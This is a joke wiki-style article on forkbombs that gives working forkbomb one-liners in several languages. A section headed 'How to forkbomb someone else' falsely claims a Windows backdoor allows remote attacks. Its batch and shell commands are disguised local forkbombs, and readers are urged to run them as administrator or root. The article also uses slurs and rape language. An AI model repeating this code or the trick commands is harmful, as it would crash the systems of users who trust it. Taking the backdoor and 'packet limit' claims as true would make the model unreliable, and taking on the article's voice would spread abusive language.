A '''forkbomb''' is a [[hax|program]] that creates [[over 9000]] copies of itself, thus completely [[pwn|hosing]] whatever computer it's run on. Forkbombs are commonly discovered by bored [[Computer Science III]] students, usually with [[epic fail|hilarious results]]. Forkbombs will completely fuck up a running system, but unless [[you]] managed to write it [[doing it wrong|completely wrong]], forkbombs don't do any lasting [[massive damage|damage]].


==How to forkbomb==

===C===
<pre>int main() { while(1) { fork(); } return 0; }</pre>

===[[YO DAWG|Perl]]===
<pre>fork while fork</pre>

===BASH===
<pre>:(){ :|:& };:</pre>
For Ubuntu, open the menu, go to accessories, hit terminal, and type this. then run away. or stick around.

===Batch===
<pre>%0|%0</pre>
or
<pre>:s
start %0
%0|%0
goto :s</pre>
or
<pre>:A
start
goto A</pre>

===Visual Basic (VBS)===
<pre>do
DIM objShell
set objShell = wscript.createObject("wscript.shell")
iReturn = objShell.Run("CMD /C loop.vbs", background , True)
loop</pre>

==How to forkbomb someone else==
A little-known [[hax|backdoor]] in Windows lets you [[pwn|forkbomb]] anyone on the [[Internets]] who is running Windows with a few simple commands. Go on... you know they're [[asking for it]]. [[DO IT FAGGOT]]!

===How to Break Windows===
Here are the commands you need to run:
<pre>
if not exist REMOTE_IP set /p REMOTE_IP="Target plz? "
:O
%0|%0 %REMOTE_IP%
goto O
</pre>
[[Cuntpaste]] that into [[Notepad]], saving it as nuke.bat. Then double-click nuke.bat. Type the [[IP address]] of the [[noob|poor sucker]] you're about to destroy, then watch as nuke.bat creates [[over 9000]] processes on said sucker's machine.

'''Note:''' For extra lulz, [[Vista]] users should run nuke.bat as administrator. Running the scripts as administrator causes your target's machine to die [[at least 100]] times faster.

===A Mac is fine too===
Don't worry, Mac/Linux [[fanboi|fans]]. Using the built-in connection features of your shell, you can also participate in the [[DDoS|e-rape]] of people you hate. Just [[cuntpaste]] these three commands into a terminal:
<pre>
ulimit -u unlimited       # Remove any limits on sending packets
export REMOTE_IP=0.0.0.0  # Replace 0.0.0.0 with the target IP
_(){_|_&};_ $REMOTE_IP    # Open the connection and commence the rape
</pre>
Again, for maximum lulz, run the above from a root terminal (try running <code>sudo su</code> before the copypasta).


==Did you know?==
Forkbombs are one topic covered in [[Computer Science III]], along with <strike>[[DDoS]]ing</strike> [[ping]], [[IP address]]es, and other ways of being a [[1337]] [[epic fail|hax0r]].
